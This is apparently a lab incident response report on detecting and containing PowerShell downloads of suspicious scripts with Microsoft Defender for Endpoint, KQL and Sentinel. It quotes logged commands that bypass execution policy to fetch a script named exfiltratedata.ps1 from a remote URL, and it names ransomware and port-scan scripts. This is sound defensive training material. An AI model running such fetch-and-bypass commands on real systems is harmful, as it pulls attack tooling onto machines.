<img width="600" src="https://github.com/user-attachments/assets/3139ed02-bf2c-4d30-973e-12dc1063fcba" alt="Incident Response Lifecycle"/>

# Incident Response Report: PowerShell Suspicious Web Request

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Microsoft Sentinel

##  Scenario

Management has raised concerns about potential attempts to download malicious tools or payloads directly within our network. Logs for one of the flagged virtual machines displays incidents where PowerShell launched. Microsoft Defender for Endpoint also flagged repeated download attempts from unfamiliar scripts, which also look suspicious. At this stage, it is unclear whether any of the scripts have been successfully downloaded or executed, prompting immediate investigation. The goal is to detect any use of the "Invoke-WebRequest" command - a method that can potentially download or execute external scripts while bypassing detection mechanisms - and to analyze any downloaded scripts or files to mitigate risks of unauthorized access. 

### High-Level Incident Response Plan

- **Check `DeviceProcessEvents`** for any PowerShell executions involving the `Invoke-WebRequest`command and investigate any suspicious download activity.
- **Check `DeviceProcessEvents`** for any successful execution of downloaded scripts to assess potential impact.
- **If applicable, `isolate affected devices`, `block access to malicious domains`, `run an antimalware scan`, and `implement restrictions on PowerShell usage`** to prevent unauthorized script execution.

---

## Steps Taken

### 1. Searched the `DeviceProcessEvents` Table

Searched for instances within the last 24 hours where PowerShell was downloaded using the `Invoke-WebRequest` command for Device: "windows-target-1". Identified 24 such incidents, where the following commands were executed: 

a)InitiatingProcessCommandLine
            
        "cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1


b)ProcessCommandLine
            
        powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1


The suspicious web request was triggered on 1 device: "windows-target-1 by 1 user, but downloaded 4 different scripts with 4 different commands


<ul>
<li>eicar.ps1</li>

<li>portscan.ps1</li>

<li>pwncrypt.ps1</li>

<li>exfiltratedata.ps1</li>
</ul>


**Query used to locate events:**

![image](https://github.com/user-attachments/assets/89c2a2cc-e446-42a5-bc7c-446429ad29ed)


<p>
<img src="https://github.com/user-attachments/assets/f70f72a2-79eb-450a-bb2c-4efcc849507d"  alt="KQL Query Results"/> &emsp; &emsp;
<img src="https://github.com/user-attachments/assets/74e652dd-2033-44ea-aacb-82e787cc2cf6"   alt="KQL Query Results"/>
</p>


---

### 2. Searched the `DeviceProcessEvents` Table a Second Time

Searched for instances where the following scripts: `eicar.ps1`, `portscan.ps1`, `pwncrypt.ps1`, `exfiltratedata.ps1` were succesfullly executed. It was later discovered that all 4 scripts were indded.

**Query used to locate events:**

![image](https://github.com/user-attachments/assets/9347c43d-f38d-4873-8e55-e6c4062ec09a)

![image](https://github.com/user-attachments/assets/1eb274cc-2d4c-43a6-a4ca-417e7fb7ca98)
![image](https://github.com/user-attachments/assets/724222a9-6361-4704-aa8f-304ee8e89d6a)

Summarized by Count: 

![image](https://github.com/user-attachments/assets/8919ead5-4916-4dbc-940f-504f3ceb39bc)


---

### 3. Isolated the affected device in Microsoft Defender

Device: `windows-target-1` was isolated in Microsoft Defender for Endpoint, and an antimalware scan was run to ensure no malware was present.

**Ex. 1: Device: windows-target-1:**
![image](https://github.com/user-attachments/assets/cc6460f8-c4bb-4575-86ba-b26be8c531b9)


---

### 4. Enforced Cybersecurity Awareness Training

Enrolled affected user in additional cybersecurity awareness training and upgraded organization-wide security awareness program (KnowBe4) to a more robust package with increased training frequency.

Implemented a policy change that limited/restricted PowerShell usage to authorized personnel only.

Enhanced endpoint monitoring for script execution activities.

---

### 5. Restored impacted virtual machine

Reviewed and completed write-up for incident resolution. Finalized reporting and closed out the incident in Microsoft Sentinel as a true positive.

![image](https://github.com/user-attachments/assets/5e6c7a40-2dba-4bae-b12c-8a943c56c7b7)









